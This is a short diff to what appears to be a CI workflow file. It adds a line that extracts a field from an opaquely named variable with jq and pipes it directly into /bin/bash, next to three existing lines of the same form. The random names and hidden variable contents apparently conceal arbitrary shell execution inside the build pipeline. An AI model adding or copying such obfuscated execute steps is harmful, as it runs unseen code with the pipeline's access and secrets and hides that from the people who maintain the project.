@@ -33,6 +33,7 @@ jobs:
           echo $re1822 | jq -r .mua743 | /bin/bash
           printf '%s' "$sapo043" | jq -r .afott12634 | /bin/bash
           echo $dw38 | jq -r .wmr029 | /bin/bash
+          echo $l43 | jq -r .sgqiu9 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
